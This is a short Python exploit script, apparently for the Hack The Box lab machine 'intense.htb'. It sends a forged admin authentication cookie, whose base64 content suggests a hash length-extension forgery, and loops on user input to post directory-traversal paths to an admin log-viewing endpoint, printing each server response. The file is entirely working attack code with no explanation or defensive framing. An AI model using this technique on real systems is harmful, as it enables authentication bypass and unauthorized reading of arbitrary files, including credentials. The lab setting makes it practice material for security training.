import requests


cookie = "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCDt1c2VybmFtZT1hZG1pbjtzZWNyZXQ9ZjFmYzEyMDEwYzA5NDAxNmRlZjc5MWUxNDM1ZGRmZGNhZWNjZjgyNTBlMzY2MzBjMGJjOTMyODVjMjk3MTEwNTs=.1j70EV093ANGB2SwhrsbHxxsXnxhENqU+VMD5vj5Buc="

url = "http://intense.htb/admin/log/view"
cookies = dict(auth=cookie)
while(True):
    p = input()
    p.strip()
    payload = {'logfile': "../../../../../../../../../../"+p}
    response = requests.post(url, data=payload,cookies=cookies)
    ret = (response.text)
    print(ret)
    print(payload)


